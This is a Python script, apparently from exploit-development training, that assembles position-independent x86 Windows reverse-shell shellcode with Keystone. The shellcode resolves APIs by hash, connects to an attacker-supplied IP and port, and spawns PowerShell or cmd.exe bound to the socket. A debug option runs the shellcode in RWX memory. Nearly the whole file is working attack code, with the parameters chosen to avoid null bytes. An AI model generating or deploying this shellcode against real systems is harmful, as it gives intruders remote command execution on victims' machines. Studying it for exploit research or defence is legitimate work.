import sys, struct, ctypes
from keystone import *

# Author: Tyler McCann (@tylerdotrar)
# Arbitrary Version Number: v1.0.0


# Return Help 
if '--help' in sys.argv:
    print('''
Usage: gen_rev.py [options]

Options:
  <attackerIP>    -->  IP address to connect to      (default: 127.0.0.1)
  <attackerPort>  -->  Listening port to connect to  (default: 443)
  --cmd           -->  Target shell uses 'cmd.exe' instead of 'powershell.exe'
  --dbg           -->  Execute shellcode, allowing attachment to the process
  --help          -->  Return help message
''')
    sys.exit()


# Default Values
attackerIP   = '127.0.0.1'
attackerPort = 443
targetShell  = 'powershell.exe'
use_CMD      = False 
debug_mode   = False


# Toggle Debugging
if '--dbg' in sys.argv:
    debug_mode = True 


# Toggle shell 
if '--cmd' in sys.argv:
    targetShell = 'cmd.exe'
    use_CMD     = True 


# Check Arguments (maybe do some input validation in the future)
if len(sys.argv) > 1 and not sys.argv[1] == '--dbg' and not sys.argv[1] == '--cmd':
    attackerIP = sys.argv[1]
if len(sys.argv) > 2 and not sys.argv[2] == '--dbg' and not sys.argv[2] == '--cmd':
    attackerPort = int(sys.argv[2])

print("[+] Shellcode Parameters:")
print(" o  IP    --> " + attackerIP)
print(" o  Port  --> " + str(attackerPort))
print(" o  Shell --> " + targetShell)


# Helper: Create a negative, reversed (LE) 32-bit IP address to avoid null bytes 
def assembleIP(ipAddress):
    ip_array = ipAddress.split('.')
    ip_array.reverse()
    hex_rep = "0x"
    for octet in ip_array:
        hex_rep += '{:02x}'.format(int(octet))
    neg_int = -int(hex_rep, 16)
    return hex(neg_int & (2**32-1))


# Helper: Format reversed (LE) 32-bit or 16-bit port to avoid null bytes 
def assemblePort(listeningPort):
    hex_prefix = '0x'
    if listeningPort > 255: # Port will require two bytes
        hex_port = hex(listeningPort & 0xFFFF)[2:].zfill(4)
        if listeningPort % 256 == 0: # Port will end in a null byte
            le_port = hex_prefix + hex_port[:2]
            return f"al, {le_port}" # Move primary port to the last byte
        else:
            le_port  = hex_prefix + (hex_port[2:] + hex_port[:2])
            return f"ax, {le_port}"  # Move formatted port to last two bytes 
    else: # Port only requires one byte
        hex_port = hex_prefix + hex(listeningPort & 0xFFFF)[2:].zfill(2)
        return f"ah, {hex_port}" # Move formatted port to third byte


# Helper: Generate 32-bit hex hash of a function 
def getHash(functionName):
    hash = 0
    for c in functionName:
        if (c == 0): break
        hash = (hash >> 13) | ((hash << (32-13)) & 0xFFFFFFFF)
        hash += ord(c)
    return hex(hash)


# Helper: Reverse (LE) hex strings up to 32-bits --> https://cyberchef.org/#recipe=Reverse('Character')To_Hex('Space',0)
# (Unused for now, but whatever)
def reverseHex(string):
    reversed_string = string[::-1]
    hex_value = ''.join(hex(ord(char))[2:] for char in reversed_string)
    return '0x' + hex_value


# Intel (x86) Assembly to Execute
CODE = (

    ### ESTABLISH FIND_FUNCTION() /W KERNEL32 ###
    
    # `find_function()` is a custom function to be stored at [ebp+0x04]
    # `kernel32.dll` pointer to be stored in EBX
    
    # `find_function()` allows retrieval/storage of addresses to functions within DLL's.
    #  - Target DLL to search through has its base address stored in the EBX register
    #  - Function to search for has its name hashed (4 bytes) and pushed to the stack before calling `find_function()`
    #  - Successful execution results in function pointer being returned in EAX
    
    "start:                     "
    "mov   ebp, esp            ;" # Creating the stack frame.
    "add   esp, 0xfffff9f0     ;" # Add a negative number to avoid the null made by the sub instruction.
    
    "find_kernel32:             " # Store base address of kernel32.dll into EBX
    "xor   ecx, ecx            ;" # ECX = 0
    "mov   esi, fs:[ecx+30h]   ;" # ESI = &PEB The "fs"fragment holds the Thread Enviroment Block of the current running process. 0x30 bytes into the TEB you get the pointer to the PEB
    "mov   esi, [esi+0Ch]      ;" # ESI = PEB->Ldr 0x0C bytes into the Process Env Block you get the LDR.
    "mov   esi, [esi+1Ch]      ;" # ESI = PEB->Ldr.InInitOrder 0x1C bytes into the LDR you get the InInitOderModuleList
    
    "next_module:               "
    "mov   ebx, [esi+8h]       ;" # EBX = ESI[X].base_address 0x8 bytes into the InInitOrderModuleList you get the base address of .
    "mov   edi, [esi+20h]      ;" # EDI = ESI[X].module_name 0x20 bytes into InInitOrderModuleList you get the name of the module
    "mov   esi, [esi]          ;" # ESI = ESI[X].flink InInitOrderModuleList
    "cmp   [edi+12*2], cx      ;" # modulename[12] == 0 (End of kernel32)
    "jne   next_module         ;"
    "jmp   push_eip            ;" # Position Independent stub
    
    "pop_eip:                   "
    "pop   esi                 ;" # ESI = EIP
    "mov   [ebp+0x04], esi     ;" # Store pointer to "find_function" in [ebp+0x04]
    "jmp   find_funcs          ;" # Now that [ebp+0x04] is mapped to find_function, jump to find_funcs
    
    "push_eip:                  "
    "call  pop_eip             ;"
    
    "find_function:             " # find_function(EBX = address of DLL)
    "pushad                    ;"
    "mov   eax, [ebx+0x3c]     ;" # Offset to PE signature
    "mov   edi, [ebx+eax+0x78] ;" # Export Table Dictionary RVA
    "add   edi, ebx            ;" # Export Table Dictionary VMA
    "mov   ecx, [edi+0x18]     ;" # Number of Names
    "mov   eax, [edi+0x20]     ;" # Address of Names RVA
    "add   eax, ebx            ;" # Address of Names VMA
    "mov   [ebp-4], eax        ;" # Save for later
    
    "find_function_loop:        "
    "jecxz end_func_loop       ;" # if (ECX == 0) end loop (jz + ecx)
    "dec   ecx                 ;"
    "mov   eax, [ebp-4]        ;" # Address of Names VMA
    "mov   esi, [eax+ecx*4]    ;" # RVA of Symbol Name
    "add   esi, ebx            ;" # VMA
    
    "compute_hash:              "
    "xor   eax, eax            ;" # EAX = 0
    "cdq                       ;" # EDX = 0 xor edx, edx
    "cld                       ;" # Make sure string processing is left to right.
    
    "compute_hash_l:            "
    "lodsb                     ;" # AL = *ESI This is the symbol/function name
    "test  al, al              ;" # AL == 0 Will be null when at the end of the string.
    "jz    compute_hash_fin    ;"
    "ror   edx, 0x0d           ;" # edx >> 13 The actual hashing algo
    "add   edx, eax            ;"
    "jmp   compute_hash_l      ;"
    
    "compute_hash_fin:          "
    
    "find_function_cmp:         "
    "cmp   edx, [esp+0x24]     ;" # Check the request function hash
    "jnz   find_function_loop  ;"
    "mov   edx, [edi+0x24]     ;" # EDX = AddressOfNameOrdinals RVA
    "add   edx, ebx            ;" # AddressOfNameOridinals VMA
    "mov   cx, [edx+2*ecx]     ;" # Get the functions ordinal
    "mov   edx, [edi+0x1C]     ;" # AddressOfFunctions RVA
    "add   edx, ebx            ;" # AddressOfFunctions VMA
    "mov   eax, [edx+4*ecx]    ;" # Function address RVA
    "add   eax, ebx            ;" # Function address VMA
    "mov   [esp+0x1C], eax     ;" # Overwrite pushed to stack
    
    "end_func_loop:             "
    "popad                     ;"
    "ret                       ;"
    
    
    ### ESTABLISH FUNCTION POINTERS ### 
    
    # Kernel32.dll:
    # TerminateProcess() --> [ebp+0x10]
    # LoadLibraryA()     --> [ebp+0x14]
    # CreateProcessA()   --> [ebp+0x18]
    
    # Ws2_32.dll:
    # WSAStartup()       --> [ebp+0x1c]
    # WSASocketA()       --> [ebp+0x20]
    # WSAConnect()       --> [ebp+0x24]
    
    
    # Using Kernel32.dll
    "find_funcs                           :"
    f"push  {getHash('TerminateProcess')} ;" # TerminateProcess Hash: 0x78b5b983
    "call   dword ptr [ebp+0x04]          ;" # Call find_function(TerminateProcess)
    "mov    [ebp+0x10], eax               ;" # Store pointer to TerminateProcess into [ebp+0x10]
    f"push  {getHash('LoadLibraryA')}     ;" # LoadLibraryA Hash: 0xec0e4e8e
    "call   dword ptr [ebp+0x04]          ;" # Call find_function(LoadLibraryA)
    "mov    [ebp+0x14], eax               ;" # Store pointer to LoadLibraryA into [ebp+0x14]
    f"push  {getHash('CreateProcessA')}   ;" # CreateProcessA Hash: 0x16b3fe72
    "call   dword ptr [ebp+0x04]          ;" # Call find_function(CreateProcessA)
    "mov    [ebp+0x18], eax               ;" # Store pointer to CreateProcessA into [ebp+0x18]
    
    # Find Ws2_32.dll
    "xor   eax, eax             ;" # Zero out EAX 
    "mov   ax, 0x6c6c           ;" # Move 'll' to 16-bit register
    "push  eax                  ;" # Push 'll' followed by two null bytes
    "push  0x642e3233           ;" # Push '32.d' (reversed)
    "push  0x5f327357           ;" # Push 'Ws2_' (reversed)
    "push  esp                  ;" # Pointer to pushed string 
    "call  dword ptr [ebp+0x14] ;" # Call LoadLibraryA(Ws2_32.dll)
    "mov   ebx, eax             ;" # Store Ws2_32.dll pointer inside EBX 
    
    # Using Ws2_32.dll
    f"push  {getHash('WSAStartup')} ;" # WSAStartup Hash: 0x3bfcedcb
    "call   dword ptr [ebp+0x04]    ;" # Call find_function(WSAStartup)
    "mov    [ebp+0x1c], eax         ;" # Store pointer to WSAStartup into [ebp+0x1c]
    f"push  {getHash('WSASocketA')} ;" # WSASocketA Hash: 0xadf509d9
    "call   dword ptr [ebp+0x04]    ;" # Call find_function(WSASocketA)
    "mov    [ebp+0x20], eax         ;" # Store pointer to WSASocketA into [ebp+0x20]
    f"push  {getHash('WSAConnect')} ;" # WSAConnect Hash: 0xb32dba0c
    "call   dword ptr [ebp+0x04]    ;" # Call find_function(WSAConnect)
    "mov    [ebp+0x24], eax         ;" # Store pointer to WSAConnect into [ebp+0x24]
    

    ### ESTABLISH SOCKET CONNECTION ###

    # WSAStartup() [ebp+0x1c]
    # - Arg 1: wVersionRequired --> highest version of Windows Socket supported (e.g., 2.2)
    # - Arg 2: lpWSAData        --> pointer to memory location to recieve output WSADATA struct (size: 400 bytes)
    
    "xor   ebx, ebx            ;" # Null EAX
    "mov   bx, 0x202           ;" # Move 0x202 (2.2) into last two bytes of EBX 
    "xor   eax, eax            ;" # Null EAX
    "mov   ax, 0x0190          ;" # Size of WSAData struct (400 bytes)
    "sub   esp, eax            ;" # Make room for the struct
    "push  esp                 ;" # Arg 2: lpWSAData        --> pointer to 400 byte output buffer  
    "push  ebx                 ;" # Arg 1: wVersionRequired --> 0x202 (2.2) 
    "call  dword ptr[ebp+0x1c] ;" # Call WSAStartup()
    
    
    # WSASocketA() [ebp+20]
    # - Arg 1: af             --> address family (e.g., AF_INET/IPv4 = 0x02)
    # - Arg 2: type           --> type specification for the socket (e.g., SOCK_STREAM = 0x01)
    # - Arg 3: protocol       --> protocol to be used (e.g., IPPROTO_TCP = 0x06)
    # - Arg 4: lpProtocolInfo --> pointer to WSAPROTOCOL_INFO struct (null)
    # - Aeg 5: g              --> existing socket group ID (null)
    # - Arg 6: dwFlags        --> additional socket flags (null)
    
    "xor   eax, eax             ;" # Null EAX
    "push  eax                  ;" # Arg 6: dwFlags        --> null
    "push  eax                  ;" # Arg 5: g              --> null
    "push  eax                  ;" # Arg 4: lpProtocolInfo --> null 
    "mov   al, 0x06             ;" # Move 0x06 to last byte of EAX
    "push  eax                  ;" # Arg 3: protocol       --> 0x06 (IPPROTO_TCP) 
    "sub   al, 0x05             ;" # Subtract 0x05 from AL, resulting in 0x01
    "push  eax                  ;" # Arg 2: type           --> 0x01 (SOCK_STREAM)
    "inc   eax                  ;" # Increase EAX, EAX = 0x02
    "push  eax                  ;" # Arg 1: af             --> 0x02 (AF_INET)
    "call  dword ptr [ebp+0x20] ;" # Call WSASocketA()
    "mov   esi, eax             ;" # Store the output SOCKET descriptor to ESI
   

    # Create `sockaddr_in` struct for WSAConnect()
    # Reference: https://learn.microsoft.com/en-us/windows/win32/winsock/sockaddr-2
    
    "xor   eax, eax                      ;" # Null EAX
    "push  eax                           ;" # Push sin_zero[] (four null bytes)
    "push  eax                           ;" # Push sin_zero[] (four null bytes)
    f"mov  ecx, {assembleIP(attackerIP)} ;" # Push negative, reversed IP address to avoid null bytes 
    "neg   ecx                           ;" # Invert to positive
    "push  ecx                           ;" # sin_addr: reversed attacker IP address 
    f"mov  {assemblePort(attackerPort)}  ;" # Dynamically push one or two byte port to sub-register
    "shl   eax, 0x10                     ;" # Left shift EAX by 0x10 bits
    "add   al, 0x02                      ;" # Add 0x02 (AF_INET) to AX
    "push  eax                           ;" # Push sin_port & sin_family
    "mov   edi, esp                      ;" # Store pointer to sockaddr_in in EDI
    
    
    # WSAConnect() [ebp+0x24]
    # - Arg 1: s            --> temp (pointer to socket descriptor, ESI) 
    # - Arg 2: *name        --> temp (pionter to sockaddr_in struct, EDI)
    # - Arg 3: namelen      --> temp (0x10)
    # - Arg 4: lpCallerData --> temp (null)
    # - Arg 5: lpCalleeData --> temp (null)
    # - Arg 6: lpSQOS       --> temp (null)
    # - Arg 7: lpGQOS       --> temp (null)
    
    "xor   eax, eax             ;"  # Null EAX
    "push  eax                  ;"  # Arg 7: lpGQOS       --> null
    "push  eax                  ;"  # Arg 6: lpSQOS       --> null
    "push  eax                  ;"  # Arg 5: lpCalleeData --> null 
    "push  eax                  ;"  # Arg 4: lpCallerData --> null 
    "add   al, 0x10             ;"  # Set AL to 0x10
    "push  eax                  ;"  # Arg 3: namelen      --> 0x10 
    "push  edi                  ;"  # Arg 2: *name        --> pointer to sockaddr_in struct 
    "push  esi                  ;"  # Arg 1: s            --> pointer to socket descriptor
    "call  dword ptr [ebp+0x24] ;"  # Call WSAConnect()
    
    
    ### LAUNCH SHELL USING SOCKET HANDLES ###

    # Create `STARTUPINFO` struct for CreateProcessA()
    # Reference: https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-startupinfoa
    
    "push  esi          ;" # Member 18: hStdError       --> ESI (socket descriptor)
    "push  esi          ;" # Member 17: hStdOutput      --> ESI (socket descriptor)
    "push  esi          ;" # Member 16: hStdInput       --> ESI (socket descriptor)
    "xor   eax, eax     ;" # Zero out EAX 
    "push  eax          ;" # Member 15: lpReserved2     --> null
    #"push eax          ;" # Member 14: cpReserved2     --> zero???
    "push  eax          ;" # Member 13: cbReserved2 & wShowWindow (how???) --> null
    "mov   al, 0x80     ;" # Move 0x80 to AL
    "xor   ecx, ecx     ;" # Zero out ECX 
    "mov   cl, 0x80     ;" # Move 0x80 to CL
    "add   eax, ecx     ;" # Add ECX to EAX (0x80 + 0x80 = 0x100)
    "push  eax          ;" # Member 12: dwFlags         --> 0x100 (STARTF_USESTDHANDLES)
    "xor   eax, eax     ;" # Zero out EAX  
    "push  eax          ;" # Member 11: dwFillAttribute --> null
    "push  eax          ;" # Member 10: dwYCountChars   --> null
    "push  eax          ;" # Member 9 : dwXCountChars   --> null
    "push  eax          ;" # Member 8 : dwYSize         --> null
    "push  eax          ;" # Member 7 : dwXSize         --> null
    "push  eax          ;" # Member 6 : dwY             --> null
    "push  eax          ;" # Member 5 : dwX             --> null
    "push  eax          ;" # Member 4 : lpTitle         --> null
    "push  eax          ;" # Member 3 : lpDesktop       --> null
    "push  eax          ;" # Member 2 : lpReserved      --> null
    "mov   al, 0x44     ;" # Move 0x44 to AL
    "push  eax          ;" # Member 1 : cb              --> 0x00000044
    "mov   edi, esp     ;" # Store pointer to STARTUPINFOA in EDI
    "xor   ax, ax       ;" # Zero out EAX 
)

# Execute 'cmd.exe'
if use_CMD:
    CODE += (
        "push  ax                   ;" # Push two null bytes 
        "mov   byte ptr [esp], 0x65 ;" # Push 'e' overwriting one null byte 
        "mov   ax, 0x7865           ;" # Move 'ex' (reversed) to 16-bit register
        "push  ax                   ;" # Push 'ex' (reversed)
        "push  0x2e646d63           ;" # Push 'cmd.' (reversed)
    )

# Execute 'powershell.exe'
else:
    CODE += (
        "mov   ax, 0x6578 ;" # Move 'xe' (reversed) to 16-bit register
        "push  eax        ;" # Push 'xe' (reversed) followed by two null bytes 
        "push  0x652e6c6c ;" # Push 'll.e' (reversed)
        "push  0x65687372 ;" # Push 'rshe' (reversed)
        "push  0x65776f70 ;" # Push 'powe' (reversed)
    )

CODE += (

    # CreateProcessA() [ebp+0x18]
    # - Arg 1:  lpApplicationName    --> temp (null)
    # - Arg 2:  lpCommandLine        --> temp (PowerShell or CMD)
    # - Arg 3:  lpProcessAttributes  --> temp (null)
    # - Arg 4:  lpThreadAttributes   --> temp (null)
    # - Arg 5:  bInheritHandles      --> temp (True = 0x01)
    # - Arg 6:  dwCreationFlags      --> temp (null)
    # - Arg 7:  lpEnvironment        --> temp (null)
    # - Arg 8:  lpCurrentDirectory   --> temp (null)
    # - Arg 9:  lpStartupInfo        --> temp (pointer to STARTUPINFOA)
    # - Arg 10: lpProcessInformation --> temp (space for output information, e.g, 0x390)

    "mov   ebx, esp             ;" # Store string pointer into EBX for CreateProcessA() arg 2 
    "mov   eax, esp             ;" # Store string pointer into EAX for CreateProcessA() arg 10
    "xor   ecx, ecx             ;" # Zero out ECX
    "mov   cx, 0x390            ;" # Move 0x390 to CX
    "sub   eax, ecx             ;" # Subtract CX from EAX to avoid overwriting the structure later
    "push  eax                  ;" # Arg 10: lpProcessInformation --> `ESP-0x390`
    "push  edi                  ;" # Arg 9:  lpStartupInfo        --> `STARTUPINFOA`
    "xor   eax, eax             ;" # Zero out EAX   
    "push  eax                  ;" # Arg 8:  lpCurrentDirectory   --> null 
    "push  eax                  ;" # Arg 7:  lpEnvironment        --> null 
    "push  eax                  ;" # Arg 6:  dwCreationFlags      --> null (zero)
    "inc   eax                  ;" # Increment EAX for TRUE (0x01)
    "push  eax                  ;" # Arg 5:  bInheritHandles      --> 0x01
    "dec   eax                  ;" # Decrement EAX back to zero 
    "push  eax                  ;" # Arg 4:  lpThreadAttributes   --> null 
    "push  eax                  ;" # Arg 3:  lpProcessAttributes  --> null 
    "push  ebx                  ;" # Arg 2:  lpCommandLine        --> `powershell.exe` or `cmd.exe`
    "push  eax                  ;" # Arg 1:  lpApplicationName    --> null
    "call  dword ptr [ebp+0x18] ;" # Call CreateProcessA()
    
    
    # Gracefully terminate via TerminateProcess() [ebp+0x10]
    # - Arg 1: hProcess  --> Handle to process being terminated (current process)
    # - Arg 2: uExitCode --> Exit error code
    
    "xor   eax, eax             ;" # Null EAX
    "push  eax                  ;" # Arg 2: uExitCode --> 0x0 (ERROR_SUCCESS)
    "push  0xffffffff           ;" # Arg 1: hProcess  --> 0xffffffff (-1)
    "call  dword ptr [ebp+0x10] ;" # Call TerminateProcess()
)


# Build Shellcode
ks = Ks(KS_ARCH_X86, KS_MODE_32)
encoding, count = ks.asm(CODE)

print("\n[+] Encoded %d instructions" % count)
shellcode_printable = ""
sh = b""
for e in encoding:
    sh += struct.pack("B", e)
    shellcode_printable += "\\x{0:02x}".format(int(e)).rstrip("\n")
shellcode = bytearray(sh)
print("[+] Shellcode size: %d" % len(shellcode) + " bytes")


# Execute Shellcode for Debugging (e.g., via WinDbg)
if debug_mode:

    # Allocate Mememory and Copy Shellcode into said Memory
    ptr = ctypes.windll.kernel32.VirtualAlloc(
                ctypes.c_int(0),
                ctypes.c_int(len(shellcode)),
                ctypes.c_int(0x3000),
                ctypes.c_int(0x40)
            )
    buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
    ctypes.windll.kernel32.RtlMoveMemory(
                ctypes.c_int(ptr),
                buf,
                ctypes.c_int(len(shellcode))
            )
    
    print("\n[+] Shellcode located at address %s" % hex(ptr))
    print(" o  Attach to the Python instance to debug.")
    input("\n...PRESS ENTER TO RUN THE SHELLCODE...")
    
    # Create Thread to Execute Shellcode
    ht = ctypes.windll.kernel32.CreateThread(
                ctypes.c_int(0),
                ctypes.c_int(0),
                ctypes.c_int(ptr),
                ctypes.c_int(0),
                ctypes.c_int(0),
                ctypes.pointer(ctypes.c_int(0))
            )
    ctypes.windll.kernel32.WaitForSingleObject(
                ctypes.c_int(ht),
                ctypes.c_int(-1)
            )


# Print Bytes
else:

    # Print Shellcode String (one-liner)
    print("\n[+] Raw Shellcode")
    print("shellcode = b\"" + shellcode_printable + "\"")
    
    # Split the original printable string into 16-byte chunks
    chunk_size = 64
    chunks = [shellcode_printable[i:i+chunk_size] for i in range(0, len(shellcode_printable), chunk_size)]
    byte_chunks = '\n'.join(['    b"' + chunk + '"' for chunk in chunks])
    
    # Print Shellcode String (formatted; 16-byte chunks)
    bytes_formatted = "(\n" + byte_chunks + "\n)"
    print("\n[+] Formatted Shellcode")
    print("shellcode = " + bytes_formatted)
